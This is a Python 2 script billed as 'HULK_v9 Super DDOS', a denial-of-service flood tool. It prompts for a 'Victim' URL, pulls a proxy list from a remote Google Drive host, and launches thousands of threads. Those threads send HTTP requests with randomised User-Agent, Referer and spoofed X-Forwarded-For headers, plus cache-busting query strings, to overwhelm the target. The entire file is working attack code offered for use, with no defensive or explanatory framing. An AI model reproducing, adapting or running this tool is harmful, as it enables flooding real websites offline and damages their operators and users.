#!/usr/bin/env python
#coding: utf-8
#..:: > HULK_v9 < ::.. Mod By Twi

import random
import socket
import threading
import time
import datetime
import urllib2
import urllib
import re
import sys
import optparse
import os
import urlparse

#Hulk Mod By Twi
url='http://free-proxy-list.net/'
proxy='http://free-proxy-list.net/'
option=1
checked_proxy=1
url='http://free-proxy-list.net/'
host='http://free-proxy-list.net/'
option=1
checked_proxy=0
headers_useragents=[9999]
headers_referers=[9999]
keyword_top=[9999]
request_counter=10000000000000
flag=0
safe=0
def inc_counter():
 global request_counter
 request_counter+=100000
 
def set_flag(val):
 global flag
 flag=val
 
def set_safe():
 global safe
 safe=1

def getUserAgent():
    platform = random.choice(['Macintosh', 'Windows', 'X11'])
    if platform == 'Macintosh':
        os  = random.choice(['68K', 'PPC', 'Intel Mac OS X'])
    elif platform == 'Windows':
        os  = random.choice(['Win3.11', 'WinNT3.51', 'WinNT4.0', 'Windows NT 5.0', 'Windows NT 5.1', 'Windows NT 5.2', 'Windows NT 6.0', 'Windows NT 6.1', 'Windows NT 6.2', 'Win95', 'Win98', 'Win 9x 4.90', 'WindowsCE', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows 10'])
    elif platform == 'X11':
        os  = random.choice(['Linux i686', 'Linux x86_64'])
    browser = random.choice(['chrome', 'firefox', 'ie'])
    if browser == 'chrome':
        webkit = str(random.randint(500, 599))
        version = str(random.randint(0, 44)) + '.0' + str(random.randint(0, 9999)) + '.' + str(random.randint(0, 999))
        return 'Mozilla/5.0 (' + os + ') AppleWebKit/' + webkit + '.0 (KHTML, like Gecko) Chrome/' + version + ' Safari/' + webkit
    elif browser == 'firefox':
        currentYear = datetime.date.today().year
        year = str(random.randint(2000, currentYear))
        month = random.randint(1, 12)
        if month < 10:
            month = '0' + str(month)
        else:
            month = str(month)
        day = random.randint(1, 30)
        if day < 10:
            day = '0' + str(day)
        else:
            day = str(day)
        gecko = year + month + day
        version = str(random.randint(1, 21)) + '.0'
        return 'Mozilla/5.0 (' + os + '; rv:' + version + ') Gecko/' + gecko + ' Firefox/' + version
    elif browser == 'ie':
        version = str(random.randint(1, 14)) + '.0'
        engine = str(random.randint(1, 14)) + '.0'
        option = random.choice([True, False])
        if option == True:
            token = random.choice(['.NET CLR', 'SV1', 'Tablet PC', 'Win64; IA64', 'Win64; x64', 'WOW64']) + '; '
        else:
            token = ''
        return 'Mozilla/5.0 (compatible; MSIE ' + version + '; ' + os + '; ' + token + 'Trident/' + engine + ')'

def referer_list():

	global headers_referers
        headers_referers.append('https://www.facebook.com/sharer/sharer.php?u=https://www.facebook.com/sharer/sharer.php?u=')
        headers_referers.append('http://www.google.com/?q=')
        headers_referers.append('https://www.facebook.com/l.php?u=https://www.facebook.com/l.php?u=')
        headers_referers.append('https://l.facebook.com/l.php?u=https://l.facebook.com/l.php?u=')
        headers_referers.append('https://drive.google.com/viewerng/viewer?url=')
        headers_referers.append('http://www.google.com/translate?u=')
        headers_referers.append('https://developers.google.com/speed/pagespeed/insights/?url=')
        headers_referers.append('http://help.baidu.com/searchResult?keywords=')
        headers_referers.append('http://www.bing.com/search?q=')
        headers_referers.append('https://add.my.yahoo.com/rss?url=')
        headers_referers.append('https://play.google.com/store/search?q=')
        headers_referers.append('https://www.google.com.vn/?gws_rd=ssl#q=')
	headers_referers.append('http://webcache.googleusercontent.com/search?q=cache:')
        headers_referers.append('http://yandex.ru/yandsearch?text=')  
        headers_referers.append('http://go.mail.ru/search?mail.ru=1&q=')
        headers_referers.append('http://www.ask.com/web?q=')
        headers_referers.append('http://search.aol.com/aol/search?q=')
        headers_referers.append('http://validator.w3.org/feed/check.cgi?url=')
        headers_referers.append('http://host-tracker.com/check_page/?furl=')
        headers_referers.append('http://www.online-translator.com/url/translation.aspx?direction=er&sourceURL=')
        headers_referers.append('http://jigsaw.w3.org/css-validator/validator?uri=')
        headers_referers.append('http://regex.info/exif.cgi?dummy=on&imgurl=')
        headers_referers.append('http://translate.google.com/translate?u=')
        headers_referers.append('http://www.w3.org/2001/03/webdata/xsv?style=xsl&docAddrs=')
        headers_referers.append('http://validator.w3.org/check?uri=')
        headers_referers.append('http://jigsaw.w3.org/css-validator/validator?uri=')
        headers_referers.append('http://validator.w3.org/checklink?uri=')
        headers_referers.append('http://www.w3.org/RDF/Validator/ARPServlet?URI=')     
        headers_referers.append('http://validator.w3.org/p3p/20020128/p3p.pl?uri=')
        headers_referers.append('http://online.htmlvalidator.com/php/onlinevallite.php?url=')
        headers_referers.append('http://feedvalidator.org/check.cgi?url=')
        headers_referers.append('http://www.google.com/ig/adde?moduleurl=')
        headers_referers.append('http://host-tracker.com/check_page/?furl=')
	headers_referers.append('https://duckduckgo.com/?q=')
        headers_referers.append('http://www.ask.com/web?q=')
        headers_referers.append('http://search.aol.com/aol/search?q=')
        headers_referers.append('https://www.facebook.com/search/results/?init=quick&q=')
	headers_referers.append('http://webcache.googleusercontent.com/search?q=cache:')     
        headers_referers.append('http://www.wolframalpha.com/input/?i=')
        headers_referers.append('http://host-tracker.com/check_page/?furl=')
        headers_referers.append('http://www.online-translator.com/url/translation.aspx?direction=er&sourceURL=')
        headers_referers.append('http://jigsaw.w3.org/css-validator/validator?uri=')
        headers_referers.append('http://nova.rambler.ru/search?query=')
        headers_referers.append('https://ru.wikipedia.org/w/index.php?search=')
        headers_referers.append('https://search.yahoo.com/search?p=')
        headers_referers.append('http://go.mail.ru/search?q=')
        headers_referers.append('https://www.google.ru/?gws_rd=ssl#newwindow=1&q=')
        headers_referers.append('http://www.ask.com/web?q=')
	headers_referers.append('https://www.facebook.com/sharer/sharer.php?u=https://www.facebook.com/sharer/sharer.php?u=')
        headers_referers.append('http://www.google.com/?q=')
        headers_referers.append('https://www.facebook.com/l.php?u=https://www.facebook.com/l.php?u=')
        headers_referers.append('https://l.facebook.com/l.php?u=https://l.facebook.com/l.php?u=')
        headers_referers.append('https://drive.google.com/viewerng/viewer?url=')
        headers_referers.append('http://www.google.com/translate?u=')
        headers_referers.append('https://developers.google.com/speed/pagespeed/insights/?url=')
        headers_referers.append('http://help.baidu.com/searchResult?keywords=')
        headers_referers.append('http://www.bing.com/search?q=')
        headers_referers.append('https://add.my.yahoo.com/rss?url=')
        headers_referers.append('https://play.google.com/store/search?q=')
        headers_referers.append('https://www.google.com.vn/?gws_rd=ssl#q=')
        headers_referers.append('http://yandex.ru/yandsearch?text=')   
        headers_referers.append('http://go.mail.ru/search?mail.ru=1&q=')
        headers_referers.append('http://www.ask.com/web?q=')
        headers_referers.append('http://search.aol.com/aol/search?q=')
        headers_referers.append('http://validator.w3.org/feed/check.cgi?url=')
        headers_referers.append('http://host-tracker.com/check_page/?furl=')
        headers_referers.append('http://www.online-translator.com/url/translation.aspx?direction=er&sourceURL=')
        headers_referers.append('http://jigsaw.w3.org/css-validator/validator?uri=')
	headers_referers.append('http://webcache.googleusercontent.com/search?q=cache:')
	headers_referers.append('http://webcache.googleusercontent.com/search?q=cache:')       
        headers_referers.append('https://www.shodan.io/search?query=')
        headers_referers.append('https://www.google.fr/?gws_rd=ssl#q=')
        headers_referers.append('https://www.facebook.com/search/results/?init=quick&q=')
        headers_referers.append('https://www.google.com.ph/#q=') 
	headers_referers.append('https://bigfuture.collegeboard.org/sitesearch?q=')
        headers_referers.append('http://dictionary.reference.com/browse/as?s=')
        headers_referers.append('https://www.facebook.com/search/results/?init=quick&q=')
	headers_referers.append('http://www.wolframalpha.com/input/?i=')
	headers_referers.append('http://host-tracker.com/check_page/?furl=')
	headers_referers.append('http://www.online-translator.com/url/translation.aspx?direction=er&sourceURL=')
	headers_referers.append('http://jigsaw.w3.org/css-validator/validator?uri=')
	headers_referers.append('http://webcache.googleusercontent.com/search?q=cache:')
	headers_referers.append('http://www.shodanhq.com/search?q=')
	headers_referers.append('https://qrobe.it/search/?q=')
	headers_referers.append('https://www.google.com.au/#q=')
	headers_referers.append('https://www.google.co.nz/#q=')
	headers_referers.append('https://www.google.ru/webhp?hl=ru&newwindow=1&ei=YCJrVdTMNs6LuwT3kIC4Cg#newwindow=1&hl=ru&q=')
	headers_referers.append('http://search.iminent.com/es-ES/search/#q=')
        headers_referers.append('http://regex.info/exif.cgi?=')
        headers_referers.append('http://anonymouse.org/cgi-bin/anon-www.cgi/')
        headers_referers.append('http://www.google.com/translate?=')
	headers_referers.append('http://webcache.googleusercontent.com/search?q=cache:')
        headers_referers.append('http://translate.google.com/translate?=')
        headers_referers.append('http://validator.w3.org/feed/check.cgi?=')
        headers_referers.append('http://www.w3.org/2001/03/webdata/xsv?style=xsl&docAddrs=')
        headers_referers.append('http://validator.w3.org/check?=')
        headers_referers.append('http://jigsaw.w3.org/css-validator/validator?=')
        headers_referers.append('http://validator.w3.org/checklink?uri=')
        headers_referers.append('http://regex.info/exif.cgi?url=')
        headers_referers.append('http%3A%2F%2Fwww.w3.org%2F2002%2F08%2Fextract-semantic.xsl&xmlfile=') 
        headers_referers.append('http://www.w3.org&xslfile=')   
        headers_referers.append('http://online.htmlvalidator.com/php/onlinevallite.php?=')
        headers_referers.append('http://feedvalidator.org/check.cgi?=')
        headers_referers.append('http://www.google.com/ig/adde?module=')
        headers_referers.append('http://host-tracker.com/check_page/?f=')
        headers_referers.append('http://panel.stopthehacker.com/services/validate-payflow?email=1@1.com&callback=a&target=')
        headers_referers.append('http://www.onlinewebcheck.com/check.php?=')
        headers_referers.append('https://www.facebook.com/l.php?u=https://www.facebook.com/l.php?u=')
        headers_referers.append('https://l.facebook.com/l.php?u=https://l.facebook.com/l.php?u=')
        headers_referers.append('https://drive.google.com/viewerng/viewer?url=')
        headers_referers.append('http://www.w3.org&xslfile=')
        headers_referers.append('http://www.w3.org/services/tidy?docAddr=')      
        headers_referers.append('http://online.htmlvalidator.com/php/onlinevallite.php?=')
        headers_referers.append('http://feedvalidator.org/check.cgi?url=')
        headers_referers.append('http://www.google.com/ig/adde?module=')
	headers_referers.append('https://www.facebook.com/sharer/sharer.php?u=https://www.facebook.com/sharer/sharer.php?u=')
        headers_referers.append('http://www.google.com/?q=')
        headers_referers.append('https://www.facebook.com/l.php?u=https://www.facebook.com/l.php?u=')
        headers_referers.append('https://l.facebook.com/l.php?u=https://l.facebook.com/l.php?u=')
        headers_referers.append('https://drive.google.com/viewerng/viewer?url=')
        headers_referers.append('http://www.google.com/translate?u=')
        headers_referers.append('https://developers.google.com/speed/pagespeed/insights/?url=')
        headers_referers.append('http://help.baidu.com/searchResult?keywords=')
        headers_referers.append('http://www.bing.com/search?q=')
        headers_referers.append('https://add.my.yahoo.com/rss?url=')
        headers_referers.append('https://play.google.com/store/search?q=')
        headers_referers.append('https://www.google.com.vn/?gws_rd=ssl#q=')
        headers_referers.append('http://yandex.ru/yandsearch?text=')
        headers_referers.append('http://go.mail.ru/search?mail.ru=1&q=')
        headers_referers.append('http://www.ask.com/web?q=')
	headers_referers.append('https://www.facebook.com/sharer/sharer.php?u=')
        headers_referers.append('http://www.google.com/?q=')
        headers_referers.append('https://www.facebook.com/l.php?u=https://www.facebook.com/l.php?u=')
        headers_referers.append('https://l.facebook.com/l.php?u=https://l.facebook.com/l.php?u=')
        headers_referers.append('https://drive.google.com/viewerng/viewer?url=')
        headers_referers.append('http://www.google.com/translate?u=')
        headers_referers.append('https://developers.google.com/speed/pagespeed/insights/?url=')
        headers_referers.append('http://help.baidu.com/searchResult?keywords=')
        headers_referers.append('http://www.bing.com/search?q=')
        headers_referers.append('https://add.my.yahoo.com/rss?url=')
        headers_referers.append('https://play.google.com/store/search?q=')
        headers_referers.append('https://www.google.com.vn/?gws_rd=ssl#q=')
        headers_referers.append('http://yandex.ru/yandsearch?text=')
        headers_referers.append('http://go.mail.ru/search?mail.ru=1&q=')
        headers_referers.append('http://www.ask.com/web?q=')
        headers_referers.append('http://webcache.googleusercontent.com/search?q=cache:')
        headers_referers.append('http://www.google.com/?q=')
        headers_referers.append('http://yandex.ru/yandsearch?text=%D1%%D2%?=g.sql()81%..')      
        headers_referers.append('http://engadget.search.aol.com/search?q=query?=query=..')
        headers_referers.append('https://www.google.ru/#hl=ru&newwindow=1?&saf..,or.r_gc.r_pw=?.r_cp.r_qf.,cf.osb&fp=fd2cf4e896a87c19&biw=1680&bih=882')
        headers_referers.append('https://www.google.ru/#hl=ru&newwindow=1&safe..,or.r_gc.r_pw.r_cp.r_qf.,cf.osb&fp=fd2cf4e896a87c19&biw=1680&bih=925')
        headers_referers.append('http://yandex.ru/yandsearch?text=')
        headers_referers.append('https://www.google.ru/#hl=ru&newwindow=1&safe..,iny+gay+q=pcsny+=;zdr+query?=poxy+pony&gs_l=hp.3.r?=.0i19.505.10687.0.10963.33.29.4.0.0.0.242.4512.0j26j3.29.0.clfh..0.0.dLyKYyh2BUc&pbx=1&bav=on.2,or.r_gc.r_pw.r_cp.r_qf.,cf.osb&fp?=?fd2cf4e896a87c19&biw=1389&bih=832')
        headers_referers.append('http://go.mail.ru/search?mail.ru=1&q=')
        headers_referers.append('http://nova.rambler.ru/search?=btnG?=%D0?2?%D0?2?%=D0..')
        headers_referers.append('http://ru.wikipedia.org/wiki/%D0%9C%D1%8D%D1%x80_%D0%..')
        headers_referers.append('http://ru.search.yahoo.com/search;_yzt=?=A7x9Q.bs67zf..')
        headers_referers.append('http://ru.search.yahoo.com/search;?_query?=l%t=?=?A7x..')
        headers_referers.append('http://go.mail.ru/search?gay.ru.query=1&q=?abc.r..')
        headers_referers.append('/#hl=en-US?&newwindow=1&safe=off&sclient=psy=?-ab&query=%D0%BA%D0%B0%Dq=?0%BA+%D1%83%()_D0%B1%D0%B=8%D1%82%D1%8C+%D1%81bvc?&=query&%D0%BB%D0%BE%D0%BD%D0%B0q+=%D1%80%D1%83%D0%B6%D1%8C%D0%B5+%D0%BA%D0%B0%D0%BA%D0%B0%D1%88%D0%BA%D0%B0+%D0%BC%D0%BE%D0%BA%D0%B0%D1%81%D0%B8%D0%BD%D1%8B+%D1%87%D0%BB%D0%B5%D0%BD&oq=q=%D0%BA%D0%B0%D0%BA+%D1%83%D0%B1%D0%B8%D1%82%D1%8C+%D1%81%D0%BB%D0%BE%D0%BD%D0%B0+%D1%80%D1%83%D0%B6%D1%8C%D0%B5+%D0%BA%D0%B0%D0%BA%D0%B0%D1%88%D0%BA%D0%B0+%D0%BC%D0%BE%D0%BA%D1%DO%D2%D0%B0%D1%81%D0%B8%D0%BD%D1%8B+?%D1%87%D0%BB%D0%B5%D0%BD&gs_l=hp.3...192787.206313.12.206542.48.46.2.0.0.0.190.7355.0j43.45.0.clfh..0.0.ytz2PqzhMAc&pbx=1&bav=on.2,or.r_gc.r_pw.r_cp.r_qf.,cf.osb&fp=fd2cf4e896a87c19&biw=1680&bih=?882')
        headers_referers.append('http://nova.rambler.ru/search?btnG=%D0%9D%?D0%B0%D0%B..')
        headers_referers.append('http://www.google.ru/url?sa=t&rct=?j&q=&e..')       
        headers_referers.append('https://translate.googleusercontent.com/translate_c?depth=1&hl=vi&rurl=translate.google.com.vn&sl=fa&tl=vi&u=')
        headers_referers.append('https://translate.google.com.vn/translate?hl=vi&sl=fa&tl=en&u=')
        headers_referers.append('https://translate.google.com/translate?hl=vi&sl=fa&tl=en&u=')
        headers_referers.append('https://translate.google.com.vn/translate?sl=vi&tl=fa&js=y&prev=_t&hl=vi&ie=UTF-8&u=http%3A%2F%2Fpalstricksandbans.tripod.com%2Fid9.html&edit-text=')
        headers_referers.append('https://translate.google.com/translate?hl=vi&sl=en&tl=en&u=')
        headers_referers.append('https://translate.google.com/translate?hl=vi&sl=auto&tl=vi&u=')
        headers_referers.append('https://translate.google.ru/translate?hl=vi&sl=auto&tl=vi&u=')
        headers_referers.append('https://translate.google.fr/translate?hl=vi&sl=auto&tl=vi&u=')
        headers_referers.append('https://translate.google.nl/translate?hl=vi&sl=auto&tl=vi&u=')
        headers_referers.append('https://translate.google.pl/translate?hl=vi&sl=auto&tl=vi&u=')
        headers_referers.append('https://translate.google.de/translate?hl=vi&sl=auto&tl=vi&u=')
        headers_referers.append('https://translate.google.hk/translate?hl=vi&sl=auto&tl=vi&u=')
        headers_referers.append('https://translate.google.com.sg/translate?hl=vi&sl=auto&tl=vi&u=')
        headers_referers.append('https://translate.google.tn/translate?hl=vi&sl=auto&tl=vi&u=')
        headers_referers.append('https://translate.google.com.my/translate?hl=vi&sl=auto&tl=vi&u=')
        headers_referers.append('https://translate.google.it/translate?hl=vi&sl=auto&tl=vi&u=')
        headers_referers.append('https://translate.google.ca/translate?hl=vi&sl=auto&tl=vi&u=')
        headers_referers.append('https://plus.url.google.com/url?sa=j&url=')
        headers_referers.append('https://plus.google.com/u/0/share?url=')		

	return(headers_referers)

def keyword_list():
	global keyword_top
	keyword_top.append('Anonymous')	
	keyword_top.append('sex')
        keyword_top.append('World Cup')
        keyword_top.append('Singer')
        keyword_top.append('ISIS')
	keyword_top.append('Facebook')
        keyword_top.append('Robin Williams')
	keyword_top.append('World')
	keyword_top.append('ca si le roi')
        keyword_top.append('Ebola?')
	keyword_top.append('Flappy Bird')
	keyword_top.append('Conchita Wurst')
        keyword_top.append('Frozen')
	keyword_top.append('iPhone')
	keyword_top.append('iPhone5')
	keyword_top.append('iPhone6')
	keyword_top.append('iPhone7')
        keyword_top.append('Samsung Galaxy S5')
	keyword_top.append('Nexus 6')
	keyword_top.append('Moto G')
	keyword_top.append('Samsung Note 4')
        keyword_top.append('LG G3')
	keyword_top.append('Xbox One')
        keyword_top.append('Apple Watch')
	keyword_top.append('Nokia X')
	keyword_top.append('Ipad Air')
	keyword_top.append('facebook')
	keyword_top.append('IPhone')
	keyword_top.append('Star War')
	keyword_top.append('Windows 10')
	keyword_top.append('Zens Phone')
        keyword_top.append('Son Tung M-TP')
	keyword_top.append('Viurs')
	keyword_top.append('RIP Face')
	keyword_top.append('tao quan')
	keyword_top.append('gia xang')
	keyword_top.append('Roll Royce')
	keyword_top.append('Hai VL')
	keyword_top.append('FIFA')
	keyword_top.append('Bill Gate')
	keyword_top.append('UFO')
    	keyword_top.append('Microsoft')
	keyword_top.append('Mark Zuckerberg')
        keyword_top.append('youtube')
        keyword_top.append('iphone6 plus')
        keyword_top.append('download')
        keyword_top.append('movies')
        keyword_top.append('google')
        keyword_top.append('streaming')
        keyword_top.append('hotmail')
        keyword_top.append('facebook login')
        keyword_top.append('internet')
        keyword_top.append('yahoo')
        keyword_top.append('madasfish')
        keyword_top.append('antivirus software')
        keyword_top.append('ebay')
        keyword_top.append('yahoo mail')
        keyword_top.append('craigslist')
        keyword_top.append('aot')
        keyword_top.append('paid to promote')
        keyword_top.append('dvd movies online')
        keyword_top.append('gmail')
        keyword_top.append('games')
        keyword_top.append('fb')
        keyword_top.append('internetreal')
        keyword_top.append('shopping')
        keyword_top.append('proxy dozer')
        keyword_top.append('amazon')
        keyword_top.append('jobs')
        keyword_top.append('video')
        keyword_top.append('promote')
        keyword_top.append('new')
        keyword_top.append('twitter')
        keyword_top.append('minecraft')
        keyword_top.append('paid to')
        keyword_top.append('free')
        keyword_top.append('earn cpcs')
        keyword_top.append('earn chi')
        keyword_top.append('netflix')
        keyword_top.append('videos')
        keyword_top.append('net')
        keyword_top.append('pulse')
        keyword_top.append('posted by')
        keyword_top.append('date you')
        keyword_top.append('news')
        keyword_top.append('this date')
        keyword_top.append('msn')
        keyword_top.append('dating')
        keyword_top.append('birthday gifts')
        keyword_top.append('cars')
        keyword_top.append('best100tattoos')
        keyword_top.append('walmart')
        keyword_top.append('lkckclckli1i')
        keyword_top.append('sports')
        keyword_top.append('software')
        keyword_top.append('music')
        keyword_top.append('the')
        keyword_top.append('email marketing')
        keyword_top.append('broadband')
        keyword_top.append('online')
        keyword_top.append('insurance')
        keyword_top.append('movie')
        keyword_top.append('tramadol')
        keyword_top.append('weight loss')
        keyword_top.append('chat')
        keyword_top.append('home')
        keyword_top.append('yahoo google')
        keyword_top.append('car insurance')
        keyword_top.append('face')
        keyword_top.append('spyware')
        keyword_top.append('you tube')
        keyword_top.append('free tv shows')
        keyword_top.append('downloads')
        keyword_top.append('google maps')
        keyword_top.append('websbiggest')
        keyword_top.append('macromedia flash player free download')
        keyword_top.append('m nova')
        keyword_top.append('facebook friends')
        keyword_top.append('phentermine')
        keyword_top.append('weather')
        keyword_top.append('watch online')
        keyword_top.append('medical insurance')
        keyword_top.append('dating websites')
        keyword_top.append('in')
        keyword_top.append('movies online')
        keyword_top.append('friv')
        keyword_top.append('search')
        keyword_top.append('alo')
        keyword_top.append('houses for rent by owner')
        keyword_top.append('of')
        keyword_top.append('internet marketing')
        keyword_top.append('blogging make money')
        keyword_top.append('make money blogging')
        keyword_top.append('game')
        keyword_top.append('movie2k')
        keyword_top.append('walmart stores')
        keyword_top.append('credit card')
        keyword_top.append('instagram')
        keyword_top.append('Insurance')
        keyword_top.append('Loans')
        keyword_top.append('Mortgage')
        keyword_top.append('Attorney')
        keyword_top.append('Credit')
        keyword_top.append('Lawyer')
        keyword_top.append('Donate')
        keyword_top.append('Degree')
        keyword_top.append('Hosting')
        keyword_top.append('Claim')
        keyword_top.append('Conference Call')
        keyword_top.append('Trading')
        keyword_top.append('Software')
        keyword_top.append('Recovery')
        keyword_top.append('Transfer')
        keyword_top.append('Classes')
        keyword_top.append('Rehab')
        keyword_top.append('Treatment')
        keyword_top.append('Cord Blood')
        keyword_top.append('is')
        keyword_top.append('TieuWi')
        keyword_top.append('vitenam')
        keyword_top.append('usa')
        keyword_top.append('internet')
        keyword_top.append('hulk')
        keyword_top.append('top 10')
        keyword_top.append('topten')
        keyword_top.append('The Voice')
        keyword_top.append('NY')
        keyword_top.append('CA')
        keyword_top.append('Money')	
        keyword_top.append('google')
        keyword_top.append('blog')	
        keyword_top.append('gay')
        keyword_top.append('american express')
        keyword_top.append('youtube')
        keyword_top.append('American Idol')
        keyword_top.append('the voice 2015')
        keyword_top.append('got talent')	
        keyword_top.append('amazon')
        keyword_top.append('best buy')	
        keyword_top.append('jimmy fallon')	
        keyword_top.append('xbox one')	
        keyword_top.append('queen elizabeth')	
        keyword_top.append('cnn')
        keyword_top.append('fantasy football')
        keyword_top.append('less')
        keyword_top.append('syria')
        keyword_top.append('us')
        keyword_top.append('messi')
        keyword_top.append('ronaldo')
        keyword_top.append('Cristiano Ronaldo')	
        keyword_top.append('Lionel Messi')
        keyword_top.append('neymar')	
        keyword_top.append('Real Madrid')	
        keyword_top.append('Barcelona')	
        keyword_top.append('Rock')	
        keyword_top.append('Fall Ball')
        keyword_top.append('Obama')			
	return(keyword_top)

def buildblock(size):
 out_str = ''
 for i in range(0, size):
  a = random.randint(65, 90)
  out_str += chr(a)
 return(out_str)

def httpcall(url):
 referer_list()
 code=0
 if url.count("?")>0:
  param_joiner = "&"
 else:
  param_joiner = "?"
 request = urllib2.Request(url + param_joiner + buildblock(random.randint(8,10)) + '=' + buildblock(random.randint(8,10)))
 request.add_header('User-Agent', getUserAgent())
 request.add_header('Cache-Control', 'no-cache')
 request.add_header('Accept-Charset', 'ISO-8859-1,utf-8;q=0.7,*;q=0.7')
 request.add_header('Referer', random.choice(headers_referers) + host + buildblock(random.randint(5,10)))
 request.add_header('Keep-Alive', random.randint(210,220))
 request.add_header('Connection', 'keep-alive')
 request.add_header('Host',host)

 index = random.randint(0,len(listaproxy)-1)
 proxy = urllib2.ProxyHandler({'http':listaproxy[index]})
 opener = urllib2.build_opener(proxy,urllib2.HTTPHandler)
 urllib2.install_opener(opener) 
 try:
   urllib2.urlopen(request)
   if(flag==1): set_flag(0)
   if(code==500): code=0
 except urllib2.HTTPError, e:
   set_flag(1)
   code=500
   time.sleep(60)
 except urllib2.URLError, e:
   sys.exit()
 else:
   inc_counter()
   urllib2.urlopen(request)
 return(code)

class HTTPThread(threading.Thread):
 def run(self):
  try:
   while flag<2:
    code=httpcall(url)
    if (code==500) & (safe==1):
     set_flag(2)
  except Exception, ex:
   pass

class MonitorThread(threading.Thread):
 def run(self):
  previous=request_counter
  while flag==0:
   if (previous+100000<request_counter) & (previous<>request_counter):
    previous=request_counter
   if flag==2:
    print ''

#DIE_v8 Mod By Twi
def randomIp():
    random.seed()
    result = str(random.randint(1, 254)) + '.' + str(random.randint(1, 254))
    result = result + str(random.randint(1, 254)) + '.' + str(random.randint(1, 254))
    return result

def randomIpList():
    random.seed()
    res = ""
    for ip in xrange(random.randint(8, 9)):
        res = res + randomIp() + ", "
    return res[0:len(res) - 2]
class attacco(threading.Thread):
    def run(self):
        referer_list()
        current = x
       
        if current < len(listaproxy):
            proxy = listaproxy[current].split(':')
        else:
            proxy = random.choice(listaproxy).split(':')
 
        useragent = "User-Agent: " + getUserAgent() + "\r\n"
        forward   = "X-Forwarded-For: " + randomIpList() + "\r\n"
        referer   = "Referer: "+ random.choice(headers_referers) + url + "?r="+ str(random.randint(1, 9999)) +  "\r\n"
        httprequest = get_host + useragent + referer + accept + forward + connection + "\r\n"

        while nload:
         time.sleep(1)
         pass
           
        while 1:
            try:
                a = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                a.connect((proxy[0], int(proxy[1])))
                a.send(httprequest)
                try:
                    for i in xrange(4):
                        a.send(httprequest)
                except:
                    tts = 1
 
                   
            except:
                proxy = random.choice(listaproxy).split(':')

#Main
print '\n\t..:: > Edit By Twi < ::..'
print '\t  ==> #~~ Super  DDOS ~~# <==  '
# Site
url = raw_input("Victim: ")
host_url = url.replace("http://", "").replace("https://", "").split('/')[0]
#Proxy
proxyf = urllib.urlopen("https://350adf0c87a0387a8100df99cb67bc325c711efb.googledrive.com/host/0B03s85BjEAHVfkpJaVZKdDFnQ25VTEJsZE5FMzhwUjBOa1VLUFdtRDhSR01qenZ1M1hZMWs/yyy.txt").read()
listaproxy = proxyf.split('\n')
#So luong
thread = input("Number thread (40): ")
get_host = "GET " + url + " HTTP/1.1\r\nHost: " + host_url + "\r\n"
accept = "Accept-Encoding: gzip, deflate\r\n"
connection = "Connection: Keep-Alive, Persist\r\nProxy-Connection: keep-alive\r\n"
nload = 1
x = 0
print("\tHULKV9 DDOS Mod By Twi")

if url.count("/")==2:
    url = url + "/"
    m = re.search('http\://([^/]*)/?.*', url)
    host = m.group(1)
	
for x in xrange(int(thread + 7800)):
   attacco().start()
   time.sleep(0.006)
	
print "Attacking ==========================>>"
for x in xrange(503):
 t = HTTPThread()
 t.start()
 t = MonitorThread()
 t.start()
 nload = 0
while not nload:
    time.sleep(1)
